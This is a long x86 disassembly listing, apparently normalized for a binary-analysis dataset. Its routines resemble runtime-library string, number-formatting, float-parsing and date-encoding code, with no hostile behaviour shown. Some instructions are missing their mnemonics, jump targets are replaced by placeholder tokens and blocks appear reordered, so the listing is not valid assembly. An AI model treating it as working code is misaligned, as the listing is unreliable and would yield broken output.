mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404df4
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404df4
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408644
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_40866c
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ edi - 0x1 ]
pop esi
pop edi
retn
sub_408698
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_4086cc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404310
push eax
mov eax ebx
call sub_404510
mov edx eax
mov eax esi
pop ecx
call sub_408698
pop esi
pop ebx
retn
sub_4086f0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404510
mov edx eax
mov ecx edi
mov eax ebx
call sub_408698
pop edi
pop esi
pop ebx
retn
sub_408710
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408734
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408774
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4087cc
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408854
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408608
mov esi eax
inc esi
mov eax esi
call sub_408834
mov ecx esi
mov edx ebx
call sub_408634
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408890
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40bf68
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408634
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407b50
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408918
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408c6f
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_4089fa
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408a42
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_4089fa
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_40890c
pop edx
or edx edx
je r-xdata
sub_4089fa
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408c6f
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408a42
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408c6f
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408890
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408a69 ]
mov ebx ecx
sub cl 0x44
je sub_407f68
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404278
jmp r-xdata
mov esi sub_4042d8
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_407f68
sub cl 0x44
je sub_407efc
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407efc
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407f68
mov ecx 0x10
cmp bl 0x58
je sub_407efc
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_4088e8
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408e28
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407efc
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408c90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408608
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408918
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408cd0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408608
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408918
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408d24
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_404310
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404310
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_404310
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408918
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_404140
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_404050
mov eax esi
mov edx ebx
call sub_40469c
mov eax [ ebp - 0x4 ]
call sub_404310
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408918
mov edx esi
xchg edx eax
call sub_40469c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408de4
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408e28
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_4090fc
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408f27
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408f31
call sub_408f27
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408de4
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_408f8d
call sub_408f27
call sub_408f1e
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408f1e
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408de4
retn
xor ecx ecx
sub_408fc9
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408f1e
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408f1e
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_40902e
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_409082
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_408fc9
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_4090fc
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_409129
jmp r-xdata
call sub_40924b
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_409129
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402df0
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_40924b
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409328
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_4093df
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_4093ea
neg edx
mov ecx esi
call sub_4093ea
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_4093df
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_409406
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402df0
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_4093ea
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_409406
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_40943c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408e28
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404140
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40946c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408e28
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404140
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4094b8
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404510
mov edx esp
xor ecx ecx
call sub_409328
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4094e4
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404510
mov edx esp
xor ecx ecx
call sub_409328
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40952c
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409570
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_4095e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_40952c
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407b34
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407b34
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407b34
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40963c
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409678
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_40963c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
